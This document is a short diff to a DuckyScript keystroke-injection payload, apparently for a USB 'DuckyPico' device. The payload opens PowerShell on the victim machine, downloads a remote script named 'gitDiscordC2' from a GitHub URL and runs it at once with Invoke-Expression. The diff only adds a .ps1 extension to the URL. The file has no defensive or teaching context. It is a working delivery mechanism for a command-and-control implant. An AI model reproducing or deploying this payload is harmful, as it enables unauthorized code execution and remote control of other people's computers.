@@ -4,7 +4,7 @@ DELAY 200
 STRING powershell
 ENTER
 DELAY 500
-STRING Invoke-RestMethod -Uri "https://raw.githubusercontent.com/JH517/DuckyPico/refs/heads/main/gitDiscordC2" -Headers @{"Cache-Control"="no-cache"}| Invoke-Expression
+STRING Invoke-RestMethod -Uri "https://raw.githubusercontent.com/JH517/DuckyPico/refs/heads/main/gitDiscordC2.ps1" -Headers @{"Cache-Control"="no-cache"}| Invoke-Expression
 ENTER
 DELAY 50
 STRING exit
